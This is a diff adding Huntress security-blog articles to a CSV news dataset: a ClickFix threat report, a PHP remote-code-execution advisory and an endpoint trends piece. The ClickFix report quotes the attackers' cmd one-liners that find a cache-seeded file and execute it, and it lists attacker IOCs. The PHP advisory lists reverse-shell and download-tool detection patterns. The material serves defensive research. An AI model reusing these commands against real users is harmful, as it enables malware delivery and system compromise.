@@ -1,4 +1,327 @@
 ID,Story,Date,Category,Vendor,Source,Modules,Type,Title,Link,Context,Full Text
+eaeee1f4004d,eaeee1f4004d,2026-11-10 14:00 UTC,General Security News,Huntress,Huntress Blog,Threat Intelligence; Endpoint Security,Article,Beyond the clipboard: The evolving tradecraft of ClickFix,https://www.huntress.com/blog/the-evolving-tradecraft-of-clickfix,"The pages are often hosted on attacker-controlled infrastructure, but we have also seen threat actors leverage cloud-based services to circumvent detection","Acknowledgments: Special thanks to Nick Roddy and Lindsey Welch for their contributions to this investigation and writeup.
+
+Background
+
+Threat actors love ClickFix, a tactic most commonly known for tricking users into executing commands that download malicious scripts, loaders, or infostealers. Although this social engineering trick has been around for a while, threat actors continue to find new ways to utilize it. Just since early August, we've published blogs about the following:
+
+A ClickFix campaign that mimics Amazon and calls the finger utility
+
+Custom GPTs funneling targets to ClickFix lures
+
+A ClickFix-style prompt to ""decrypt"" a Google Doc
+
+A macOS-focused campaign using a ClickFix lure to determine what payload to deliver
+
+This is just a taste of the ClickFix tradecraft we've seen in recent months. For instance, we've recently been seeing it used as an initial access step leading to lateral movement. We've also seen it use browser-cache-seeded delivery chains, deliver remote access trojans (RAT) that utilize node.js, and even reconstruct executable payloads from data hidden in image files. Not only that, but we continue to track interesting trends in the way ClickFix has been initially delivered.
+
+This isn't the first time we've taken a broader look at ClickFix tradecraft, and it probably won't be the last. Consider this a snapshot of what we're currently seeing ""beyond the clipboard,"" so to speak.
+
+Delivery through malvertising
+
+Several recent ClickFix campaigns leverage malvertising, attempting to lure their targets to malicious landing pages. This may not be new, but it is nevertheless important to stay vigilant. The pages are often hosted on attacker-controlled infrastructure, but we have also seen threat actors leverage cloud-based services to circumvent detection.
+
+Typosquatting
+
+One recent incident started when a user performed a Bing search for ""Westlaw,"" a popular legal research service for lawyers, and clicked on a paid ad in the results. While the page is no longer active, logs show that the link redirected to a typosquatted domain https://vvestalw.ghost[.]io and a page titled ""Westlaw - Legal Research Platforms | Thomson Reuters."" After a couple of redirects (included in the IOCs section below) the user was brought to a fake site at https[:]//westlaw-signon[.]com, designed to look like the real site on the Thomson Reuters domain, and presented a standard ClickFix workflow.
+
+SEO poisoning
+
+Another campaign that we have seen attempts to trick users searching for LinkedIn, or alternatively real estate, to visit the threat actor's site instead.
+
+Figure 1: Sponsored search ad leading to a spoofed LinkedIn site.
+
+Upon visiting the site, the user is presented with what looks like a Cloudflare ""Verify that you are human"" turnstile. Checking the checkbox initiates the ClickFix process.
+
+Figure 2: Fake ""Verify that you are human"" turnstile.
+
+Compromised websites
+
+In other campaigns the initial presentation is even more polished, as is the case with this example of a dental practice website that was temporarily compromised with ClickFix, discovered by Huntress security researcher John Hammond.
+
+Figure 3: Compromised dental site with Manage Consent controls that launches a fake verification.
+
+The page included your typical Manage Consent pop-up, which was actually used as part of the lure. If the user clicked Accept—or clicked anywhere for that matter—they were presented with a fake Cloudflare ""Verify that you are human"" turnstile.
+
+Figure 4: Another example of a fake ""Verify you are human"" turnstile.
+
+PowerShell-based fake verifications
+
+If a user checks the box in any of these fake ""verify that you are human"" turnstiles, ClickFix instructions are presented, similar to the following.
+
+Figure 5: ClickFix instructions.
+
+A PowerShell command is put into the clipboard at this point, containing malicious instructions. However, we've recently noticed attackers including some form of output that the user will see that makes it appear as though a verification process is taking place. These fake verification messages likely reassure the target that the command they just pasted is doing what the page promised, drawing further attention away from the malicious activity by presenting what appears to be part of a legitimate security check.
+
+For example, some ClickFix campaigns open a terminal and display messages, with colored text, that make it appear as though a verification process is underway. However, what's actually happening is the payload is being downloaded and executed.
+
+Figure 6: Examples of fake verification messages displayed in the terminal.
+
+Some PowerShell even includes alternate messages. For instance, if a check for the presence of the payload at the end of the command fails, it displays an error. This may be designed to convince the user to try downloading it again, if for whatever reason the command didn't work.
+
+Figure 7: PowerShell command showing the message displayed if the download check fails.
+
+A message in a terminal is one thing, but some ClickFix commands go far further. In the case of the compromised dental site above, the copied PowerShell included an elaborate script to create a window that presented a detailed series of ""checks,"" along with animated progress bars that turned green when complete.
+
+Figure 8: Fake Cloudflare Security Challenge built entirely from pasted PowerShell ClickFix command.
+
+Payloads
+
+ClickFix is still most often associated with a simple outcome: a user executes a command that downloads a script, loader, or infostealer. But recent incidents have shown that the technique can lead to much more varied payloads.
+
+That variety shows up in two areas—what ClickFix delivers and what attackers do with the foothold it creates. The technique can deliver different types of malware, help attackers establish persistence and expand access across an environment, or serve as the first stage in a more complex delivery chain.
+
+Not an RMM? RATs
+
+While ClickFix attacks often deliver infostealers and loaders, Huntress has occasionally observed remote access trojans (RATs) delivered as the final payload. For instance, one of the campaigns mentioned above abused ChatGPT's Custom GPT feature to trick users into downloading a Windows MSI installer that drops a custom RAT.
+
+In another ClickFix campaign that relied on an MSI installer, the final payload masqueraded as a remote monitoring and management (RMM) tool dubbed DuskDesk—a possible nod to RustDesk, an open source RMM. However, DuskDesk is actually a Node.js-based RAT.
+
+In two incidents investigated by Huntress, an MSI package from apirequestaccess[.]com installed a Node.js wrapper into the user's AppData directory to launch malicious JavaScript (LimeMint.js).
+
+Along with spawning PowerShell for system fingerprinting, the malware established persistence by creating a user Run key named ""DuskDesk"" that executes node.exe with launch.js at every user logon.
+
+While DuskDesk might be mistaken for a legitimate RMM in the user's environment, active connections revealed that node.exe established a TCP connection to the remote IP address 167.148.201[.]104 on port 3861, potentially enabling the attacker to establish command-and-control (C2) capability.
+
+While similar tradecraft has been reported elsewhere, the incidents we investigated feature evolved tradecraft, including a more configurable DAT file and the addition of wrapped PowerShell commands.
+
+Lateral movement to the domain controller
+
+We've seen instances of lateral movement where threat actors used ClickFix to deliver a loader that pulled down a RAT, enabling them to jump to another system. These threat actors established a foothold, eventually using built-in tools to move laterally.
+
+In one incident back in February, a ClickFix prompt led to the installation of the Matanbuchus 3.0 loader and then AstarionRAT. The operator used this RAT to perform reconnaissance, steal credentials, and eventually use PsExec to hop to a Windows Server and two domain controllers.
+
+In a separate incident in May, a ClickFix attack against an unmonitored endpoint led to the installation of the Potemkin loader, RMMProject, and EtherRAT. SMBExec was used to deploy the malware through administrative shares, compromising 11 hosts before it was stopped.
+
+Unlike these two examples, an incident in early September did not rely on a dedicated RAT as its primary foothold. Instead, the threat actor leveraged a lightweight execution and persistence chain using native Windows administration protocols to move from an initial endpoint to the domain controller and then create a reverse SSH tunnel.
+
+The ClickFix command in this incident downloaded a ZIP file named cf_verify.zip into the user's Temp folder, created a folder named C:\ProgramData\f8f33b09aed97a47, and extracted the contents of the ZIP file to it, which created the following files:
+
+1.bat
+
+CertEnrollCtrl.exe
+
+CertEnroll.dll (a malicious DLL used for DLL sideloading)
+
+It then executed 1.bat, which created a user Run key and a scheduled task (both named CertEnrollCtrl_Y0db6oZq9) to run CertEnrollCtrl.exe. This executable uses the Windows Command Shell to launch a PowerShell script that performs Active Directory reconnaissance using multiple native Windows utilities:
+
+nltest.exe to enumerate domain trust relationships and identify domain controllers
+
+net.exe to query Domain Admins group membership and user account details
+
+whoami.exe to identify the current user context
+
+findstr.exe to filter command output for OS and network-configuration details
+
+Several more files were added to the Temp folder, including a TXT file (%LocalAppData%\Temp\6341434163416441.txt) that contained a Base64-encoded PowerShell command that does the following:
+
+Defines a working folder C:\ProgramData\ShService and drops an SSH private key into it
+
+Sets up a reverse SSH tunnel and connects to attacker-controlled infrastructure located at 23.227.199[.]41
+
+Creates a scheduled task named SysyService
+
+Next, the attacker used WinRM to laterally move to the primary domain controller. Once access was obtained, the attacker created a new user account and attempted to add it to the local administrators group. They then created a second reverse SSH tunnel using the same PowerShell script described above.
+
+Steganographic delivery chains
+
+In another interesting incident, we observed a ClickFix steganographic delivery chain in which a user-executed command initiated a multi-stage attack that reconstructed executable payloads from data that was hidden inside PNG files.
+
+This isn't the first time we've seen ClickFix leverage steganographic techniques, though there are some differences this time. The threat actors in the earlier incident hid shellcode instructions within images; this time it's full-blown executables.
+
+The PowerShell copied via ClickFix triggered a fake Cloudflare verification inside a terminal window, similar to what has been described above. While displaying the fake verification, the PowerShell script dropped a compressed archive named verify_pkg.zip into the victim's C:\Users\user\AppData\Local\Temp\ folder. The command then unpacked this archive and placed a legitimate, signed Microsoft binary (LockScreenContentServer.exe) into C:\ProgramData\7168f7f870a45fbb\. Accompanying this trusted executable was a rogue DLL and a batch file named 1.bat.
+
+The 1.bat file was then launched through cmd.exe, and served as a multi-stage PowerShell stager. To evade traditional network monitoring and file-based security controls, this stager relied on steganography. It retrieved benign-looking PNG image files that secretly contained embedded executable binaries within their pixel data. The PowerShell script extracted these hidden payloads, reconstructed the malicious binaries on disk, and executed them.
+
+With the payload successfully reconstructed, the malware established persistent background execution by creating a scheduled task, as well as a Run key in the registry. These steps provided the threat actor with remote access to further their attack.
+
+Cache me if you can
+
+A recent investigation conducted by John Hammond uncovered an attack that varied its actions based on the browser in use in order to carry out a browser-cache-seeded delivery chain designed to deliver a whole trove of malware.
+
+This is actually the compromised dental site mentioned previously, but to quickly recap, if a user clicked on the Manage Consent dialog box, a ""Verify you are human"" turnstile appeared. This led to a ClickFix attack that created a window with progress bars displaying fake network checks.
+
+Figure 9: Compromised dental site previously discussed.
+
+Early on, a check takes place to determine what browser the target is using. This check ultimately determines the ClickFix command that is served up to the user. For example:
+
+Firefox:cmd /c for /r ""%LOCALAPPDATA%\Mozilla\Firefox\Profiles"" %f in (f_*) do @if %~zif==17635 copy ""%f"" %TEMP%\t.bat >nul 2>nul&%TEMP%\t.bat
+
+Chrome:cmd /c for /r ""%LOCALAPPDATA%\Google\Chrome\User Data"" %f in (f_*) do @if %~zif==17635 copy ""%f"" %TEMP%\t.bat >nul 2>nul&%TEMP%\t.bat
+
+Brave:cmd /c for /r ""%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data"" %f in (f_*) do @if %~zif==17635 copy ""%f"" %TEMP%\t.bat >nul 2>nul&%TEMP%\t.bat
+
+The only difference between these commands is the folder location it points to for each browser's cache. Regardless of the browser, each command iterates through the files in the cache, looking for one that is 17,635 bytes in size.
+
+It turns out that when the fake dental side was initially loaded, a 17,635-byte file was included and saved into the cache. When the ClickFix command finds this file, it copies it to the Temp folder as a batch file and executes it. This results in several stage two payloads, with one PowerShell file in turn calling several more malicious payloads.
+
+Combating ClickFix
+
+As we said at the beginning, attackers love ClickFix. Its prevalence as an attack technique leaves little doubt of this, and the fact that threat actors continue to come up with new and novel ways to utilize it only drives the point home.
+
+It doesn't appear that these newer uses for ClickFix are part of one group's attempt to further the technique. Rather, unconnected threat actors or groups have observed how successful ClickFix has been in tricking targets and are experimenting with new ways to leverage it.
+
+Fortunately, there are several things that can be done to combat ClickFix attacks.
+
+Stop the paste
+
+At its core, ClickFix is a social engineering attack mechanism, designed to take advantage of less technical or informed users. Combatting this requires user training to recognize ClickFix lures.
+
+Train users to never paste commands into a Run dialog box, a terminal, PowerShell, or anything else at a web page's request. Emphasize that legitimate CAPTCHAs or ""verification"" workflows never require you to execute shell commands. Finally, encourage users to report suspicious pages to their Security or IT departments.
+
+Control what can execute
+
+In parallel, it's important to harden script and application execution on the endpoint. Utilize application control tools or allowlisting for untrusted executables. Block the execution from user-writable locations like the Temp folder and implement controls for unsigned binaries and suspicious archive extraction. Finally, limit the access to local administrator privileges, as well as opening the Run dialog box or a command prompt.
+
+Detect the chain
+
+Even with user training and endpoint controls in place, organizations should monitor for the behaviors that follow a successful ClickFix execution:
+
+A browser or user-launched process spawning cmd.exe, PowerShell, or Windows Terminal
+
+Encoded PowerShell commands
+
+Execution-policy bypasses
+
+Archives or executables appearing in user-writable locations
+
+Detection should also extend beyond initial execution. New scheduled tasks, new Run keys, or unexpected SSH connections can all indicate that something is amiss. Because payloads and file names can change, defenders should focus on the sequence of activity rather than relying solely on hashes, domains, or other static indicators.
+
+Indicators of Compromise (IOCs)
+
+Lateral movement attack
+
+Item
+
+Description
+
+https://vvestalw.ghost[.]io/
+
+Typosquatted redirector presented after the Bing search.
+
+https://moziw[.]com/vvestalw/
+
+Additional redirector in the delivery chain.
+
+https://westlaw-signon[.]com/
+
+ClickFix landing page that displayed the fake verification workflow.
+
+cf_verify.zip
+
+Staged malicious ZIP written to the user's temporary directory.
+
+C:\ProgramData\f8f33b09aed97a47\
+
+Staging directory containing the extracted payload files.
+
+1.bat
+
+Staged batch script that established the Run key and scheduled-task persistence.
+
+CertEnrollCtrl.exe
+
+Executable abused as a DLL-sideloading host for CertEnroll.dll.
+
+CertEnroll.dll
+
+Malicious DLL extracted from the staged archive.
+
+6341434163416441.txt
+
+Temporary file containing a Base64-encoded PowerShell command.
+
+C:\ProgramData\ShService\r.ps1
+
+PowerShell script used to establish the reverse SSH tunnel.
+
+23.227.199[.]41
+
+Attacker-controlled remote host used for reverse SSH tunneling.
+
+CertEnrollCtrl_Y0db6oZq9
+
+The name of the scheduled task and Run key value created by 1.bat for persistence.
+
+SysyService
+
+Scheduled task created to maintain the reverse tunnel.
+
+Stenographic attack
+
+Item
+
+Description
+
+LockScreenContentServer.exe
+
+SHA256: de9d325af3156232c34916840210efb5706d6e6a5eba1827c8240e4f71c09fa2
+
+Legitimate, signed Microsoft binary dropped in C:\ProgramData\7168f7f870a45fbb\ and used as the trusted executable in the DLL-sideloading chain.
+
+dui70.dll
+
+SHA256: ed37c12fc4beea98722f6f308cec45e6440c3089e1a002c837bed147fbeb0c52
+
+Malicious DLL paired with LockScreenContentServer.exe for DLL sideloading.
+
+1.bat
+
+SHA256: 4155a4c7e857d9b613e14cf00e148037859cf627cf4004f5a4257f2cd29de2cb
+
+Malicious batch file launched through cmd.exe and used as a multi-stage PowerShell stager.
+
+LockScreenContentServer_qQrRrJiHX
+
+Scheduled-task name and user Run key value used for persistence.
+
+HKU\S-1-12-1-2467919044-1094609404-2049208971-2597337003\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+
+Registry path used for user Run key persistence.
+
+DuskDesk RAT attack
+
+Item
+
+Description
+
+apirequestaccess[.]com
+
+Attacker-controlled domain used to deliver the MSI package. Its api prefix resembles domains seen in related Node.js malware cases.
+
+http://apirequestaccess[.]com/cfirm.php?token=QsKjQ1pEd43R33hJ1xV4LQwIVE8
+
+Malicious MSI download URL. The token is case-specific and should be retained in the underlying case record, but the normalized domain and path are more useful as publication-facing indicators.
+
+151.240.151[.]76
+
+IP address associated with apirequestaccess[.]com.
+
+Node.exe
+
+SHA256: e921fe5307e29bf6fd00000dd594356affd3a7b044e52720c7f10decbdc305b9
+
+Malicious Node.js runtime executable installed with the RAT.
+
+LimeMint.js
+
+Malicious JavaScript implant launched by the Node.js runtime.
+
+launch.js
+
+Node.js launcher used to start the DuskDesk execution chain.
+
+UmberOceanTan.dat
+
+Configurable data file containing the RAT's operational configuration.
+
+DuskDesk
+
+User Run key value used to launch node.exe with launch.js at user logon.
+
+167.148.201[.]104:3861
+
+Remote TCP destination observed for node.exe. The source narrative identifies this as a potential command-and-control endpoint."
 99d6c260eab2,99d6c260eab2,2026-11-09 21:00 UTC,Vulnerabilities & Patching,Huntress,Huntress Blog,Vulnerability Management; Threat Intelligence,Article,"N-able Disables Cloud Services Following Disclosure of ""Able2Shell"" Exploit Chains",https://www.huntress.com/blog/n-able-disables-cloud-services-following-disclosure-of-able2shell-exploit-chains,"During previous N-central vulnerability exploitations (such as the CVE-2026-86218 zero-day), threat actors were observed ""spraying"" downstream environments with unauthorized...","Acknowledgments: Special thanks to John Hammond, Ben Bernstein, and Andrew Brandt for their contributions to this investigation and writeup.
 
 Huntress is tracking N-able's response to the public disclosure of critical vulnerabilities in its N-central platform, a remote monitoring and management (RMM) platform built for managed service providers and IT teams. On November 9, N-able took its hosted N-central environment offline while it worked to secure the environment and apply remediation.
@@ -2859,6 +3182,169 @@ Not in ESPM Early Access yet? Click the ESPM icon in the left-hand menu of your 
 As Early Access partners put this capability to work, their feedback will decide which Windows features we tackle next and how we build those controls.
 
 Have ideas or requests? Share them at feedback.huntress.com/espm. And stay tuned. There's a lot more coming to Managed ESPM."
+373fe68f7397,2b62329cc6f4,2026-10-21 04:00 UTC,Vulnerabilities & Patching,Huntress,Huntress Blog,Vulnerability Management,Article,"Rapid Response: php2shell, Leaked Critical PHP Vulnerabilities (CVE-2026-109618 & CVE-2026-109619)",https://www.huntress.com/blog/php2shell-leaked-critical-php-vulnerabilities,Sigma / YARA Rules We'll publish detection rules to huntresslabs/threat-intel once technical details are available,"Acknowledgments: Special thanks to Lindsey Welch and Ben Nahorney for their contributions to this investigation and writeup.
+
+Update 10/21/26 @ 4:40pm ET
+
+Since PHP released its security advisory this morning to address the two critical vulnerabilities, several researchers have come forward to release the technical details of the vulnerabilities:
+
+Calif's write-up provides a detailed history of PHP memory-limit vulnerabilities, and then explains how Calif revisited those earlier findings through OpenAI's Patch the Planet initiative, uncovering multiple interruption point and reliable RCE paths.
+
+Wiz has demonstrated how the unauthenticated RCE works against WordPress, Drupal, and Joomla, and showed that a separate memory disclosure path could expose passwords, tokens, API keys, and certificates.
+
+As of October 21 at 4:30pm ET, Huntress has not observed in-the-wild exploitation on partner systems. We are continuing to monitor relevant developments linked to these vulnerabilities.
+
+Update: 10/21/26 @ 10am ET
+
+On October 21 around 9:30 am ET, the PHP team released PHP 8.5.12, 8.4.27, 8.3.36 and 8.2.35 to address the two vulnerabilities.
+
+According to PHP, all PHP installations serving web requests are at risk (including PHP-FPM, Apache with mod_php, php-cgi, FrankenPHP, and LiteSpeed). An exploit exists for mod_php where an unauthenticated request can trigger an attack before any application code runs.
+
+What to do:
+
+Source downloads are on PHP's downloads site; organizations should update to PHP 8.5.12, 8.4.27, 8.3.36 or 8.2.35 as soon as possible. For organizations that can't update immediately, PHP has also outlined measures to reduce exposure to specific attack paths in its advisory.
+
+Other update guidance from PHP:
+
+Linux distributions and LTS vendors received the patches ahead of publication. Check with your vendor for updated PHP packages.
+
+PHP 8.1 and earlier are no longer supported by the PHP project and won't receive official updates. Some distributions and LTS vendors might backport fixes for these releases, so be sure to contact your vendor for further information or upgrade to a supported version.
+
+Organizations using the volunteer-maintained rpms.remirepo.net repository should move to distribution-provided packages or build PHP from source to apply updates promptly. Updated packages from that repository won't be available today.
+
+The PHP security team has also provided minimal source-backports for PHP 7.4, PHP 8.0, and PHP 8.1. These branches are intended for organizations that build PHP from source or don't have access to an LTS vendor.
+
+For those running the older, outdated versions of PHP (prior to the 8.2.x version numbers), it's likely there will be no official patch to resolve the vulnerabilities. For environments running the deprecated, end-of-life versions of PHP, admins should immediately add the line session.upload_progress.enabled = Off to the php.ini configuration on your server. This may require you to restart your web services and/or the server itself in order to take effect, but will mitigate the known abuse cases.
+
+While the software itself in these deprecated versions will receive no official patch from the PHP maintainers, security researchers have produced their own patches that will permit admins to rebuild the PHP modules from source code. Huntress cannot evaluate whether these patches are effective, and recommend that, wherever possible (and with adequate testing to ensure the upgrade doesn't break website functionality), admins should upgrade their version of PHP on the servers they maintain to the most current 8.5.x release.
+
+The vulnerabilities:
+
+PHP released further information about the two vulnerabilities.
+
+CVE-2026-109618 is a remote code execution flaw in PHP's out-of-memory error handling. If PHP runs out of memory while setting up request data, it is interrupted and that data is only partially initialized. During request cleanup that partly initialized data is treated as valid, creating a path to code execution.
+
+The impact here is unauthenticated remote code execution (RCE) as the web worker account: according to PHP, complete RCE was validated over HTTP against mod_php with default PHP input and memory limits, and normal prefork configurations with multiple workers.
+
+CVE-2026-109619 is a remote code execution flaw caused by PHP retaining request-specific state after its backing memory has been freed. If the same worker processes a later request, PHP may access that stale state before the normal initialization resets it. This vulnerability can lead to unauthenticated heap use-after-free, memory disclosure, and remote code execution with the web worker's privileges.
+
+Huntress has not yet seen in-the-wild exploitation of these vulnerabilities across our partner base as of October 21 at 10am ET; however, others are reporting that they are seeing attacks emerging. As such, updating promptly to PHP 8.5.12, 8.4.27, 8.3.36 or 8.2.35 and following the guidance above is critical.
+
+Huntress is continuing to track developments related to CVE-2026-109618 and CVE-2026-109619. We will update this blog accordingly as new information emerges.
+
+Background
+
+On the morning of October 20, a post on Hacker News claimed that two critical PHP vulnerabilities were headed for public disclosure. The post was taken down, but not before screenshots made their way around social media. Within a few hours, our good friends over at watchTowr confirmed the leak, writing that the vulnerabilities were real and that ""we were all supposed to wait until Thursday at 11am ET.""
+
+Shortly thereafter, the PHP security team posted an advance notice of an upcoming security release addressing two critical vulnerabilities, both with a CVSS v4.0 rating of 9.2. The team scheduled that release for Wednesday, October 21 at 14:00 UTC, a day earlier than the original embargo, and noted it reserves the right to release even sooner ""should details of either vulnerability become public, or should evidence of active exploitation appear in the wild.""
+
+PHP is everywhere. It quietly powers WordPress, Drupal, Joomla, and Magento sites, shared hosting platforms, control panels, and an awful lot of software that doesn't even advertise that it runs PHP under the hood. When a critical bug lands in PHP itself, rather than in one app built on top of it, the number of places you have to go looking to identify vulnerable PHP versions gets very big, very fast.
+
+Huntress is monitoring developments related to these vulnerabilities and will update this blog as new information becomes available.
+
+What are CVE-2026-109618 and CVE-2026-109619?
+
+The flaws exist in PHP, the popular programming language running behind a huge number of websites. PHP is designed primarily for web development and is widely supported by hosting providers.
+
+Here's what we know about the PHP vulnerabilities so far (and what we don't):
+
+What we know: Both vulnerabilities are rated critical by the PHP security team. Public reporting describes them as remote code execution in PHP's core, which would mean an attacker could get the server to run commands of their choosing.
+
+What it affects: PHP has not published affected versions yet. Reports have pointed to versions 5, 6, 7, and 8 being impacted, and some researchers have said they expect fixes only for currently supported PHP 8 branches. In its official release, however, PHP said that impacted and fixed versions (along with full details of the flaws) will be published with the October 21 security release.
+
+How it works: No technical root cause has been published. We currently don't yet know which part of PHP is involved, whether it's reachable over a plain web request, or whether it depends on a particular configuration. We'll update this post when the advisory and researcher writeups are public.
+
+Why ""php2shell""? That's the name circulating among researchers. If you've followed this space for any amount of time, you know a name like that usually means one thing: someone sends a request to your website, and gets a shell on your vulnerable server.
+
+Technical Details
+
+With no public technical details yet, we can't show you the exploit. What we can do is tell you what we're looking for and what our own telemetry says about where the risk lives.
+
+What exploitation will probably look like
+
+Florian Roth, who released a free tool called process-watcher (a Linux-based process monitoring tool aimed at detecting exploitation) put it well: exploitation of these bugs will most likely show up as suspicious child processes spawned by PHP. At Huntress, that lines up with what we see in nearly every PHP intrusion we work.
+
+In practice, that means a PHP worker process like php-fpm, php-cgi, php-cgi.exe, httpd, or apache2 would launch something abnormal:
+
+Shells like sh, bash, cmd.exe, or powershell.exe
+
+Interpreters like python or perl
+
+Download or networking tools like curl, wget, nc, or certutil.exe
+
+It's worth taking a closer look at command lines that include reverse shell patterns:
+
+/dev/tcp/
+
+fsockopen
+
+mkfifo
+
+It's also worth looking at quick reconnaissance commands like whoami, id, uname -a, or ipconfig run straight from the web server.
+
+Attacker PHP abuse: what we've seen recently
+
+Even before this leak, Huntress regularly catches attackers abusing PHP applications.
+
+One pattern from a recent Huntress incident that occurred last week is a good preview of what php2shell exploitation could look like. In this incident, a PHP FastCGI process repeatedly ran a one-liner that wrote a small PHP file with random marker strings into the first writable temp directory it could find, before executing and then deleting it. If none of the directories were writable, it would print !notwrtbl! to flag that.
+
+While this pattern isn't related to php2shell, it's a good example of PHP spawning things it shouldn't.
+
+On the Linux side, most internet-facing PHP lives on web servers and shared hosting, which are not closely monitored. An exposed Linux web server without endpoint detection is the type of system where PHP flaws can be exploited quietly and remain unnoticed.
+
+Proof of Concept
+
+We have not built or reproduced a proof of concept for these vulnerabilities, and we're not aware of public exploit code as of this writing. A short exploitation video was briefly posted online and then removed. Once fixes are shipped, we expect technical details and proof-of-concept code to follow quickly, and we'll update this post.
+
+What should impacted organizations do?
+
+The fixes aren't out yet, so the goal right now is to be ready to patch the minute they land. In the meantime, there are several things you can do to shrink your exposure.
+
+Inventory every PHP install. Start with your web servers, and then go hunting for the less obvious locations: vendor appliances and Windows software that bundle php.exe or php-cgi.exe, control panels like cPanel and Plesk, and anything running WordPress, Drupal, Joomla, or Magento.
+
+Plan your patch window for Wednesday, October 21 at 10am ET. Patch internet-facing systems first. Watch the official PHP announcement for the fixed version numbers, and check your Linux distribution and hosting provider for backported packages.
+
+Identify any end-of-life PHP environments. If you're running PHP 5, 7, or 8.0/8.1, you may not get a fix at all. Upgrade, take it off the internet, or put it behind a VPN or web application firewall (WAF) until you can.
+
+Keep an eye on what PHP spawns. Alert on PHP worker processes launching shells, interpreters, or download tools. On Linux servers without endpoint detection, Florian Roth's process-watcher is a free, quick way to get this visibility today. Start it in observe mode.
+
+If you find something, isolate the server, and preserve web server and PHP logs. Look for webshells and new files in your web root, along with new cron jobs, scheduled tasks, and accounts.
+
+What is Huntress doing?
+
+Hunting across our fleet. We captured a baseline of normal PHP behavior across our partner endpoints before the release. Once fixes and technical details drop, we'll compare against it to spot new activity quickly.
+
+We already monitor for malicious activity on servers. Huntress already detects web server processes spawning shells and common webshell activity on Windows and Linux. Our SOC is on alert for PHP-related activity.
+
+Watching the patch drop. Our Adversary Tactics team is tracking the release and researcher analysis in real time, and we'll update this post with indicators and detection guidance as they become available.
+
+Auditing our internal PHP use. Huntress has reviewed relevant internal systems and taken appropriate steps to mitigate potential exposure to these vulnerabilities.
+
+Sigma / YARA Rules
+
+We'll publish detection rules to huntresslabs/threat-intel once technical details are available.
+
+Indicators of Compromise (IOCs)
+
+No indicators of compromise have been confirmed yet. This section will be updated as the situation develops.
+
+Item
+
+Description
+
+TBD
+
+Pending vendor advisory and confirmed exploitation
+
+References
+
+PHP: Upcoming Critical PHP Security Release
+
+watchTowr: PHP Remote Code Execution FAQ: CVE-2026-109618 & CVE-2026-109619
+
+BleepingComputer: PHP warns admins of two critical flaws, emergency patches coming tomorrow
+
+Florian Roth: process-watcher PHP quick start"
 3617916b1a2a,3617916b1a2a,2026-10-20 13:00 UTC,Product & Roadmap,Huntress,Huntress Blog,Email and Collaboration Security; Identity Security Posture Management,Article,Introducing ITDR Lookback: Find Out Who Was in Your Microsoft 365 Tenant Before You Were,https://www.huntress.com/blog/managed-itdr-lookback-feature,"Today, Huntress Managed ITDR's Lookback feature is generally available for newly onboarded Microsoft 365 tenants","Today, Huntress Managed ITDR's Lookback feature is generally available for newly onboarded Microsoft 365 tenants. Lookback automatically examines up to 180 days of login history to uncover evidence of compromise before Huntress connected. When a compromise is still active, our Security Operations Center (SOC) investigates and revokes the identity's active sessions.
 
 Onboarding a Microsoft 365 tenant feels like a fresh start. You go through your checklist, and a successful connection tells you monitoring has started. But it doesn't tell you if an attacker got there first. Your first day protecting a tenant might be an attacker's twenty-seventh day inside.
@@ -4333,6 +4819,432 @@ Smaller manufacturers can invest in cybersecurity by reducing access to only cri
 Is it realistic to prevent every cyber incident in manufacturing?
 
 Unfortunately, it’s not realistic in any industry to prevent 100% of cyber incidents, let alone in manufacturing. The focus should be on quick threat detection, identification, and containment."
+48ffaa1b0b6d,48ffaa1b0b6d,2026-10-14 16:00 UTC,General Security News,Huntress,Huntress Blog,Endpoint Security; Data Security Posture Management; AI Security; Threat Intelligence,Article,10 Endpoint Security Trends and Tips for 2027 | Huntress,https://www.huntress.com/blog/endpoint-security-trends,"These agents are only as strong as their training and guardrails, and they can miss novel threats or behave unpredictably if they’re attacked or misused","In 2026, the endpoint security issues facing businesses look way different from malware campaigns of a decade ago. Endpoints, identities, and cloud workloads now overlap, and traditional antivirus or perimeter-only defenses can’t keep up with fast-moving threats.
+
+Threat actors are using methods like living-off-the-land (LotL) attacks to quietly sneak into your environment. To keep up, you have to evolve your security strategy and plan for incidents before they happen.
+
+Here are 10 endpoint security trends shaping 2026 and what they mean for your business.
+
+1. Watch as the AI race speeds up
+
+Trend: As AI-powered endpoint tools become more advanced, organizations have new security and ethics risks. The focus in 2026 is on balancing autonomy with control, so AI decisions don’t go unchecked.
+
+AI used to be a nice-to-have feature. But now, it’s becoming more embedded in day-to-day security operations. Your endpoint security partner needs to be intentional about using the right AI systems.
+
+This is especially true with agentic AI, or agents that analyze huge volumes of data and even automate parts of investigations.
+
+These agents are only as strong as their training and guardrails, and they can miss novel threats or behave unpredictably if they’re attacked or misused. Attackers can also target the agents themselves as a non-human identity, trying to hijack:
+
+API keys
+
+Tokens
+
+Service accounts created for AI tools
+
+AI works best with human oversight rather than being the final decision-maker. That’s where Huntress shines, pairing AI-driven detections with 24/7 human security operations center (SOC) analysts who validate suspicious activity and step in before mistakes turn into breaches.
+
+2. Keep an eye on ransomware’s shifting tactics
+
+Trend: Ransomware is evolving. Threat actors are moving from single-encryption events to multi-layered extortion, heightening business risk and public fallout.
+
+Ransomware is still one of the biggest threats to endpoints, but the playbook has changed. Many groups now use double or triple extortion, combining data theft, encryption, and public pressure to force higher payouts.
+
+These multi-front attacks mean every minute counts. After gaining a foothold, attackers might quickly harvest credentials and threaten disclosure long before deploying encryption.
+
+With so much at stake, fast detection is critical. Strong endpoint visibility and strong ransomware protection, paired with managed endpoint detection and response, reduce dwell time and stop an incident before it spirals into downtime or data exposure.
+
+3. Get your incident response plan in shape
+
+Trend: Security is about preparation just as much as prevention. Without a tested IR plan, even small attacks can spin out into chaos.
+
+Plenty of businesses have security measures, but not nearly enough have a clear, tested incident response (IR) plan. In fact, in Verizon’s 2025 Data Breach Investigations Report, they discovered only 55% of companies have a fully documented IR plan. And IBM’s Cost of a Data Breach Report 2025 revealed that just 30% regularly test those plans.
+
+When an attack hits and no one’s sure who does what, it’s easy to lose precious time just figuring out the basics. Details like who to call and how to communicate with leadership or customers can quickly slip through the cracks without a defined plan.
+
+A solid IR plan outlines:
+
+Roles
+
+Decision paths
+
+Contact trees
+
+It also includes playbooks for common scenarios like ransomware and suspicious remote access.
+
+The right partner for managed endpoint detection and response (EDR) can support that plan with real-world expertise, the way Huntress can. That experience includes 24/7 monitoring and clear guidance for your team as they move from detection to clean-up.
+
